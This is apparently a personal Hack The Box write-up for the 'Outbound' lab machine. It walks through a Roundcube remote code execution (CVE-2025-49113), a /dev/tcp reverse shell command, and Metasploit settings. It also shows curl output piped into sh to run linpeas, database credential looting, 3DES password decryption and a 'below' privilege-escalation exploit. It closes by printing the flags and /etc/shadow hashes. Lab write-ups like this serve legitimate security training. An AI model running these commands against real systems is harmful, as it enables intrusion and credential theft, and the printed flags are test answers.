---
file_created: 25 Sep 2025 22:39
title: Outbound
difficulty: Easy
difficult_sort: 1
points: 20
os: Linux
target_ip: 10.10.11.77
platform: Hack The Box
category: B2R
box_status: Active
url: https://app.hackthebox.com/machines/Outbound
user_flag: true
root_flag: true
completed: false
date_finish: 2025-09-26
tags:
  - htb/machines
---
# Resolution summary
As is common in real life pentests, you will start the Outbound box with credentials for the following account:
>tyler:LhKL1o9Nm3X2

>[!summary]
>- Step 1
>- Step 2
## Tutorial

```cardlink
url: https://medium.com/@akinsolatoluwani25/outbound-htb-7320bd379871
title: "OUTBOUND HTB"
description: "Been a while i did a box on hack the box, talk more of a writeup. Man’s a bit rusty ngl but we a’right still. Let’s get into it"
host: medium.com
favicon: https://miro.medium.com/v2/5d8de952517e8160e40ef9841c781cdc14a5db313057fa3c3de41c6f5b494b19
image: https://miro.medium.com/v2/resize:fit:1200/1*EaevIvcNGtyovbCSrL1mWw.png
```

## Improved Skills
- Skill 1
- Skill 2

## Tools Used 
- rustscan ; nmap ; gobuster, metasploit
---
# Information Gathering

## Scanned all TCP ports:
```bash
rustscan -a $IP -r 1-65535 -t 10000 --ulimit 5000

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

## Enumerated open ports:
```bash
nmap -sC -sV -Pn $IP -p 22,80

Nmap scan report for mail.outbound.htb (10.10.11.77)
Host is up (0.46s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Roundcube Webmail :: Welcome to Roundcube Webmail
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Enumerated Top 200 UDP Ports
Scanned the top 200 UDP ports to ensure no additional services were missed:
```bash
nmap -sU --top-ports 200 -oN $IP
```
---
# Enumeration
## Port 22 - SSH (OpenSSH)
- version - OpenSSH 9.6p1
- Affected to CVE-2025-26466, DOS Vulnerability, not good for RCE.
- Use as entrypoint
![](<./attachments/Outbound-16.png>)
## Port 80 - HTTP (nginx)
- version - nginx 1.24.0 
Redirects to `http://mail.outbound.htb/`
```bash
echo "10.10.11.77 outbound.htb mail.outbound.htb" | sudo tee -a /etc/hosts
```
- Browse to [mail.outbound.htb](http://mail.outbound.htb/) and login in with the creds that is provided
>tyler:LhKL1o9Nm3X2

![](<./attachments/Outbound-1.png>)
- After Login in, go to to about section to gain more info
- `roundcube webmail 1.6.10` is the version of the service.
- look for CVE for the service.
![](<./attachments/Outbound.png>)
>[!Bug]
>CVE-2025-49113
>for more [info](https://www.cyber.gc.ca/en/alerts-advisories/vulnerability-impacting-roundcube-webmail-cve-2025-49113)

![](<./attachments/Outbound-2.png>)

---
# Exploitation
## CVE-2025-49113 - Roundcube Remote Code Execution
![](<./attachments/Outbound-3.png>)
### Reverse Shell via netcat
using this proof of concept([POC](https://github.com/hakaioffsec/CVE-2025-49113-exploit)) from `hakaioffsec`
```bash
git clone https://github.com/hakaioffsec/CVE-2025-49113-exploit
cd CVE-2025-49113-exploit
```
**Ussage**
```bash
php CVE-2025-49113.php <url> <username> <password> <command>
```

- first run netcat listener
```bash
netcat -lvnp 4444
```
**Command**
```bash
php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.112/4444 0>&1"'
```
- Access reverse shell as `www-data`
```bash
export TERM=xterm
```
### Metasploit Method
```bash
msfconsole -q
msf6 > search roundcube
msf6 > use 1
```
![](<./attachments/Outbound-4.png>)
**Configure exploit**
```bash
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > options
set PASSWORD LhKL1o9Nm3X2
set RHOSTS 10.10.11.77
set TARGETURI http://mail.outbound.htb/?_task=mail&_mbox=INBOX
set USERNAME tyler
set VHOST mail.outbound.htb
set LHOST 10.10.14.112
```

```sh
meterpreter > shell
#get useable shell
script /dev/null -c bash
id
```
![](<./attachments/Outbound-5.png>)

---
# Lateral Movement to jacob

## Local enumeration
- Found multiple (3) in `/home`
```bash
www-data@mail:/var/www/html/roundcube/public_html$ ls -la /home
total 32
drwxr-xr-x 1 root  root  4096 Jun  8 12:05 .
drwxr-xr-x 1 root  root  4096 Jul  9 12:41 ..
drwxr-x--- 1 jacob jacob 4096 Jun  7 13:55 jacob
drwxr-x--- 1 mel   mel   4096 Jun  8 12:06 mel
drwxr-x--- 1 tyler tyler 4096 Jun  8 13:28 tyler

www-data@mail:/var/www/html/roundcube/public_html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- Next, ran [**LinPEAS**](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh) for automated privilege escalation enumeration.

- On my attacker machine, started a simple HTTP server to serve linpeas.sh, **linpeas must be in directory**:
```bash
python3 -m http.server 8080 #Host
```
- On the target machine, I downloaded and executed linpeas.sh:
```bash
cd /dev/shm/
curl 10.10.14.112:8080/linpeas.sh | sh #Victim
```
**Found Interesting Info**
![](<./attachments/Outbound-6.png>)
- locate in ` /var/www/html/roundcube/config/config.inc.php`
```bash
cat  /var/www/html/roundcube/config/config.inc.php
```
 The password, the username and the database “roundcube” is plain as day in the config file.
## Lateral movement vector
```sql
mysql -u roundcube -pRCDBPass2025 roundcube
```
![](<./attachments/Outbound-7.png>)
```sql
SHOW FULL TABLES;
select * FROM users;
select * FROM session;
```
![](<./attachments/Outbound-8.png>)
![](<./attachments/Outbound-9.png>)
Whole session data was in base 64 format, need [CyberChef](https://gchq.github.io/CyberChef/) to decode.
select alphabet `y64:A-Za-z0-9._-`decoding from **base 64**, use the **y64** option to give plain text.
![](<./attachments/Outbound-10.png>)
found user `jacob` and encode password
>`L7Rv00A8TuwJAr67kITxxcSgnIk25Am/`

found encrytion key in **config.inc.php** file
>`rcmail-!24ByteDESkey*Str`

- Found out that roundcube uses `Triple-DES (DES-EDE3-CBC)` for its encryption so head on over to [CyberChef](https://gchq.github.io/CyberChef/)  but before decrypting, we have to decode from **base 64 to hex format** so as to have a valid input to decode
 ![](<./attachments/Outbound-11.png>)
- It also **requests for an IV**
![](<./attachments/Outbound-12.png>)
which is 8 bytes and it is the **first 8 alphanumeric pair** when convert the password form base 64 down to hex
![](<./attachments/Outbound-13.png>)
The input for when decoding will be the rest of the converted hex format
![](<./attachments/Outbound-14.png>)
- Method: `Triple DES Decrypt`
- Key -UTF8: `rcmail-!24ByteDESkey*Str`
- IV - HEX: `2f b4 6f d3 40 3c 4e ec`
- Input: `09 02 be bb 90 84 f1 c5 c4 a0 9c 89 36 e4 09 bf`
![](<./attachments/Outbound-15.png>)
>jacob:595mO8DmwGeD
>can't use as ssh access
```bash
www-data@mail:/$ su jacob
su jacob
# Password: 595m08DmwGeD
```

 **Found ssh creds**
 - located in `/home/jacob/mail/INBOX/jacob`
```bash
jacob@mail:/$ cat /home/jacob/mail/INBOX/jacob
```
- The important contents
![](<./attachments/Outbound-18.png>)
![](<./attachments/Outbound-19.png>)
>[!IMPORTANT] SSH Creds
>jacob:gY4Wr3a1evp4
### SSH-Access
```bash
ssh jacob@10.10.11.77 -p22
#gY4Wr3a1evp4
```

```sh title:sshpass
sshpass -p 'gY4Wr3a1evp4' ssh jacob@10.10.11.77 -p22
```
- **Found user flag**
![](<./attachments/Outbound-17.png>)
---
# Privilege Escalation to root

## Local enumeration
entry point and in most times is always the command that can run without the root password `sudo -l`
```bash
jacob@outbound:~$ id

uid=1002(jacob) gid=1002(jacob) groups=1002(jacob),100(users)

sudo -l

Matching Defaults entries for jacob on outbound:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*

ls /home -al
total 20
drwxr-xr-x  5 root  root  4096 Jul  8 20:14 .
drwxr-xr-x 23 root  root  4096 Jul  8 20:14 ..
drwxr-x---  5 jacob jacob 4096 Sep 26 11:02 jacob
drwxr-x---  2 mel   mel   4096 Jul  8 20:14 mel
drwxr-x---  2 tyler tyler 4096 Jul  8 20:14 tyler
```
- Run Linpeas
```bash
python3 -m http.server 8080 #Host
```

```bash
cd /dev/shm
wget http://10.10.14.112:8080/linpeas.sh
```

`jacob` can run the binary **below** as root.
## Privilege Escalation vector -CVE-2025-27591
**Research on “below”**
Googling led to this repo:  
👉 [Linux-Privilege-Escalation-CVE-2025–27591](https://github.com/dollarboysushil/Linux-Privilege-Escalation-CVE-2025-27591)
It describes a **privilege escalation vulnerability in** `**below**`.
```bash
wget http://10.10.14.112:8080/dbs_exploit.py
python3 dbs_exploit.py
```
![](<./attachments/Outbound-21.png>)
- root access, the flag located in `/root/root.txt`
---
# 🏁 Conclusion

- **Foothold**: Roundcube 1.6.10 RCE (CVE-2025–49113)
- **Lateral Movement**: MySQL loot → decrypt 3DES password → Jacob’s webmail → SSH creds
- **Privilege Escalation**: Abused `below` binary (CVE-2025-27591)
- **Flags:**
- `user.txt` (Jacob)
- `root.txt` (Root after exploit)

This was a well-designed box combining **web exploitation**, **crypto analysis**, and **privilege escalation**.

---
# Trophies

## User Flag
```txt
caf8a6c270b553297e1bdd0b7face05a
```
## Root Flag
```txt
d57404bedcc2344b1549a6dc6dabc118
```
## **/etc/shadow**
```bash
cat /etc/shadow |grep -F '$'
```

```txt
root:$y$j9T$pYysWAL0lX2oSXNpBeXs81$yinIBrOJnhJj7viI.GiorNEgZFyIewJbS3qnjgXth16:20247:0:99999:7:::
mel:$y$j9T$5lR6zOH0Y8G/9ZDhogu2o0$9..CpGSBi06uovpNhGjqaMhPkc3Yw/svG9T3bSBoeS2:20247:0:99999:7:::
tyler:$y$j9T$t1QDz.OaqfevjpnRfQrRY.$jJwx2.H.OkiHiW8T0f.3A1qS5ZfA7.nmwU3TE1otfb.:20247:0:99999:7:::
jacob:$y$j9T$5JYw1WIG1mlmMdj6BrGVV/$yimg6djeBwfHAaDiOPoU0le/aURm6fRaG.DXzBkmmmA:20247:0:99999:7:::
```

---
# Proof
![](<./attachments/Outbound-20.png>)